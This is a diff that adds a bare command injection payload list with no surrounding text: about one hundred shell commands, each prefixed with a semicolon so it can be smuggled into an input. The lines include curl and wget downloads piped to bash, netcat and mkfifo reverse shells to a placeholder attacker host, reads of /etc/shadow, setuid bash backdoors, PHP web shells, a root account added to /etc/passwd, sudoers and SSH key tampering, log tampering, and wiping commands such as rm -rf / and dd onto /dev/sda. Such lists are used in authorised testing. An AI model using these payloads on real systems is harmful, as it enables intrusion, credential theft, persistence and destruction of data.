@@ -1,0 +1,100 @@
+;ls
+;cat /etc/passwd
+;cat /etc/shadow
+;id
+;whoami
+;uname -a
+;curl malicious-site.com/malware.sh | bash
+;wget malicious-site.com/malware.sh -O - | bash
+;nc attacker-site.com 4444 -e /bin/bash
+;rm -rf /
+;echo "Payload executed" > /tmp/payload.txt
+;touch /tmp/malware.txt; echo "Malware content" > /tmp/malware.txt
+;rm -rf /tmp/*
+;find / -type f -name "*.txt"
+;netstat -an
+;ls -l /etc
+;uname -r
+;uptime
+;cat /proc/version
+;ps aux
+;df -h
+;service apache2 restart
+;service mysql start
+;mkdir /tmp/backdoor; cp /bin/bash /tmp/backdoor; chmod +s /tmp/backdoor/bash
+;chmod 777 /var/www/html/index.php
+;tar -cvf /tmp/backup.tar /home/user/*
+;zip -r /tmp/archive.zip /var/www/html/*
+;grep -r "password" /etc
+;iptables -A INPUT -s 192.168.0.1 -j DROP
+;find / -type f -name "backup*.tar"
+;useradd hacker; passwd hacker
+;echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/backdoor.php
+;mysql -u root -p -e "SELECT * FROM users;"
+;mv /tmp/backdoor /bin/
+;chmod +x /bin/backdoor
+;crontab -l
+;crontab -e
+;killall apache2
+;kill -9 <PID>
+;tail -n 50 /var/log/syslog
+;tail -f /var/log/apache2/access.log
+;chmod 666 /etc/passwd
+;chown root:root /etc/shadow
+;echo "Malicious content" >> /var/log/auth.log
+;mv /var/log/auth.log /var/log/auth.log.bak
+;ln -s /etc/passwd /var/www/html/passwd.txt
+;find / -perm -4000 -type f
+;chmod 777 /etc/sudoers
+;ln -s /bin/bash /tmp/shell; chmod 777 /tmp/shell; /tmp/shell
+;echo -n "Hello" > /dev/tcp/attacker-site.com/1234
+;grep -R "password" /var/log/
+;echo "127.0.0.1 attacker-site.com" >> /etc/hosts
+;cp /bin/bash /tmp/mybash; chmod +s /tmp/mybash
+;cat /etc/security/limits.conf
+;echo "sleep 5" | at now
+;find / -type d -name "logs" -exec rm -rf {} ;
+;chsh -s /bin/bash
+;chattr +i /etc/passwd
+;echo "Defaults !authenticate" >> /etc/sudoers
+;echo "xterm" >> /usr/share/vim/vim80/filetype.vim
+;gcc -o /tmp/backdoor /tmp/backdoor.c; chmod +x /tmp/backdoor; /tmp/backdoor
+;crontab /tmp/cronjob.txt
+;touch /var/www/html/shell.php; echo "<?php system(\$_GET['cmd']); ?>" >> /var/www/html/shell.php
+;chmod 777 /dev/null; echo "Malicious content" > /dev/null
+;echo "127.0.0.1 www.google.com" >> /etc/hosts
+;echo "www.google.com IN A 127.0.0.1" >> /etc/bind/named.conf
+;sh -c 'echo "Malicious content" > /var/www/html/backdoor.txt'
+;/bin/nc -nv attacker-site.com 4444 -e /bin/bash
+;echo "import os; os.system('id')" > /tmp/python_shell.py; python /tmp/python_shell.py
+;/usr/bin/perl -e 'print "Hello, World!\n";'
+;sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+;dd if=/dev/random of=/tmp/bigfile bs=1M count=100
+;dd if=/dev/zero of=/dev/sda
+;echo "include /etc/apache2/sites-available/malicious-site.conf" >> /etc/apache2/apache2.conf
+;nc -lvp 1234 -e /bin/bash
+;tar -xvf /tmp/archive.tar -C /tmp/
+;chown www-data:www-data /var/www/html/index.php
+;echo "rm -rf /" > /tmp/delete-everything.sh; chmod +x /tmp/delete-everything.sh
+;cp /bin/bash /bin/newbash; chmod +s /bin/newbash
+;echo "sleep 5s" | at now + 1 minute
+;echo "127.0.0.1 example.com" >> /etc/hosts
+;find / -type f -exec grep -l "password" {} ;
+;wget malicious-site.com/backdoor.php -O /var/www/html/backdoor.php
+;nc -l -p 1234 -e /bin/bash
+;echo "This is a test" | mail -s "Test Subject" user@example.com
+;chmod 777 /home/user/.ssh/authorized_keys
+;echo "secret_password" | sudo -S cat /etc/shadow
+;ln -s /usr/bin/python3 /usr/local/bin/python
+;grep -v '^#' /etc/crontab | grep -v '^$'
+;tar -cvf /tmp/backup.tar /home/user/ --exclude=/home/user/private/*
+;cp /bin/bash /tmp/.bash; chmod +s /tmp/.bash
+;echo "192.168.0.1 internal-site.com" >> /etc/hosts
+;find / -type f -name "backup*.tar" -exec rm -rf {} ;
+;chmod 777 /etc/passwd; echo "malicious_user::0:0:root:/root:/bin/bash" >> /etc/passwd; chmod 644 /etc/passwd
+;echo -e "\n<?php phpinfo(); ?>" >> /var/www/html/info.php
+;mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker-site.com 1234 > /tmp/f
+;sed -i 's/disable_functions =/disable_functions = system, exec, shell_exec/g' /etc/php.ini
+;cp /etc/shadow /var/www/html/shadow.txt; chmod 777 /var/www/html/shadow.txt
+;chmod 777 /home/user/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... fake_key" >> /home/user/.ssh/authorized_keys; chmod 600 /home/user/.ssh/authorized_keys
+;echo "import os; os.system('rm -rf /')" > /tmp/python_shell.py; python3 /tmp/python_shell.py
